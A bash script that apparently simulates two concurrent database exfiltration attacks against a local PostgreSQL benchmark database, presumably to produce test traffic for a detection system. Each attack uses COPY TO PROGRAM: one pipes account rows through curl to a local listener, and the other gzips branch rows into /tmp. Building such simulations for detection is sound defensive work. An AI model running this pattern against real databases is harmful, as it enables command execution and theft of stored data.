#!/bin/bash
# Template: 2 malicious attacks running simultaneously across 2 sessions.
# Each parallel session is a *different* attacker, so each gets its own
# unique synthetic identity.
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh

echo "Simulating 2 Malicious Attacks simultaneously across 2 different sessions..."

# The '&' pushes the command to the background, allowing the next command to
# run in parallel at the exact same millisecond.

# Attack 1 in Session A
( casce_new_identity
  psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';" > /dev/null 2>&1
) &

# Attack 2 in Session B
( casce_new_identity
  psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';" > /dev/null 2>&1
) &

# Wait for both parallel sessions to close
wait
echo "Concurrent dual-malicious attacks completed."
